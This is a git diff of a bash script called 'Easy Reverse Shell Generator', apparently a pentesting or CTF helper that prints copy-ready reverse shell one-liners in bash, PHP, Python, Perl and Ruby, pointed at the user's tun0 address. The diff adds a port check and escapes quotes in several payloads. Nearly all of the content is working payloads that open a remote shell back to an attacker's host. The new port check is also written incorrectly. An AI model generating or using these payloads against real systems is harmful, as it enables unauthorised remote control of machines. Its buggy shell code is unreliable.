@@ -30,6 +30,12 @@ tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' 
 # Take user input to set the listening port
 read -p "Enter the port you will listen on: " port
 
+if [ $port -gt 65535]
+then
+  echo "You there are only 65,535 ports to listen on!"
+  exit
+fi
+
 # List out the useful stuff 
 echo -e "${DIVIDER}[+]======================== Easy Reverse Shell Generator =======================[+]${NOCOLOR}"
 echo ""
@@ -49,16 +55,16 @@ echo -e "${COPYME}bash -i >& /dev/tcp/$tun0/$port 0>&1${NOCOLOR}"
 echo ""
 echo -e "${DIVIDER}[+] Programming Language Reverse Shells ----------------------------------------[+]${NOCOLOR}"
 echo "PHP:"
-echo -e "${COPYME}php -r '$sock=fsockopen("$tun0",$port);exec("/bin/sh -i <&3 >&3 2>&3");'${NOCOLOR}"
+echo -e "${COPYME}php -r '$sock=fsockopen(\"$tun0\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NOCOLOR}"
 echo ""
 echo "Python:"
 echo -e "${COPYME}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$tun0",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${NOCOLOR}"
 echo ""
 echo "Perl:"
-echo -e "${COPYME}perl -e 'use Socket;$i="$tun0";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'${NOCOLOR}"
+echo -e "${COPYME}perl -e 'use Socket;$i=\"$tun0\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${NOCOLOR}"
 echo ""
 echo "Ruby:"
-echo -e "${COPYME}ruby -rsocket -e'f=TCPSocket.open("$tun0",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'${NOCOLOR}"
+echo -e "${COPYME}ruby -rsocket -e'f=TCPSocket.open(\"$tun0\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${NOCOLOR}"
 echo ""
 echo -e "${DIVIDER}[+] Upgrade Your Shell ----------------------------------------------------------[+]${NOCOLOR}"
 echo -e "1) ${COPYME}python -c 'import pty; pty.spawn("/bin/bash")'${NOCOLOR}"
